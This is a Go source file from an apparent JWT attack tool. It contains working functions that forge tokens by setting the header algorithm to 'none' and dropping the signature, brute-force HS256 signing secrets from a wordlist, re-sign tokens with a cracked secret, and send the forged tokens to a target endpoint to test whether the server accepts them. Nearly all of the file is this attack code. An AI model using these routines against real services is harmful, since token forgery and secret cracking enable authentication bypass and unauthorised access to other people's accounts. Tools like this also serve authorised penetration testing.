package cmd

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	httpclient "jwttool/pkg/http"
	"jwttool/pkg/jwt"
	"net/http"
	"os"
	"strings"
	"time"
)

func setAlgNone(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return "", fmt.Errorf("invalid token format")
	}

	hdrB, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode header: %w", err)
	}

	var hdr map[string]interface{}
	if err := json.Unmarshal(hdrB, &hdr); err != nil {
		return "", fmt.Errorf("unmarshal header: %w", err)
	}

	hdr["alg"] = "none"

	newHdrB, err := json.Marshal(hdr)
	if err != nil {
		return "", fmt.Errorf("marshal header: %w", err)
	}

	newHdrEnc := base64.RawURLEncoding.EncodeToString(newHdrB)

	payload := parts[1]
	newToken := newHdrEnc + "." + payload + "."

	return newToken, nil
}

func resignHS256(originalToken string, secret string) (string, error) {
	parts := strings.Split(originalToken, ".")
	if len(parts) < 2 {
		return "", fmt.Errorf("invalid token format")
	}
	headerEnc := parts[0]
	payloadEnc := parts[1]
	signingInput := headerEnc + "." + payloadEnc

	mac := hmac.New(sha256.New, []byte(secret))
	_, _ = mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)
	sigEnc := base64.RawURLEncoding.EncodeToString(sig)

	return fmt.Sprintf("%s.%s.%s", headerEnc, payloadEnc, sigEnc), nil
}

func AttackNone(token, target, endpoint, proxy string, insecure bool) {
	client := httpclient.NewHTTPClient(target, endpoint, insecure, 10*time.Second)
	if proxy != "" {
		client.SetProxy(proxy)
	}

	modifiedToken, err := setAlgNone(token)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error modifying token to alg=none: %v\n", err)
		return
	}
	if modifiedToken == "" {
		fmt.Fprintln(os.Stderr, "Modified token is empty")
		return
	}

	client.SetHeader("Authorization", "Bearer "+modifiedToken)

	resp, err := client.DoRequest()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error making request: %v\n", err)
		return
	}
	if resp == nil {
		fmt.Fprintln(os.Stderr, "No response received")
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Response Status: %s\n", resp.Status)

	if resp.StatusCode == http.StatusOK {
		fmt.Println("The server accepted the token with 'none' algorithm.")
	} else {
		fmt.Println("The server rejected the token with 'none' algorithm.")
	}
	if resp.StatusCode == http.StatusUnauthorized {
		fmt.Println("Unauthorized access - the token was rejected.")
	}
}

func AttackCrack(token, wordlist, target, endpoint, proxy string, insecure bool) {
	client := httpclient.NewHTTPClient(target, endpoint, insecure, 10*time.Second)
	if proxy != "" {
		client.SetProxy(proxy)
	}

	secret, err := jwt.CrackHS256(token, wordlist)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error cracking token: %v\n", err)
		return
	}
	if secret == "" {
		fmt.Fprintln(os.Stderr, "No secret found")
		return
	}
	fmt.Printf("Found secret: %q\n", secret)

	signedToken, err := resignHS256(token, secret)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error resigning token: %v\n", err)
		return
	}
	fmt.Println("Using re-signed token for the online check.")

	client.SetHeader("Authorization", "Bearer "+signedToken)

	resp, err := client.DoRequest()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error making request: %v\n", err)
		return
	}
	if resp == nil {
		fmt.Fprintln(os.Stderr, "No response received")
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Response Status: %s\n", resp.Status)
	if resp.StatusCode == http.StatusOK {
		fmt.Println("The server accepted the cracked token.")
	} else {
		fmt.Println("The server rejected the cracked token.")
	}
	if resp.StatusCode == http.StatusUnauthorized {
		fmt.Println("Unauthorized access - the token was rejected.")
	}
}
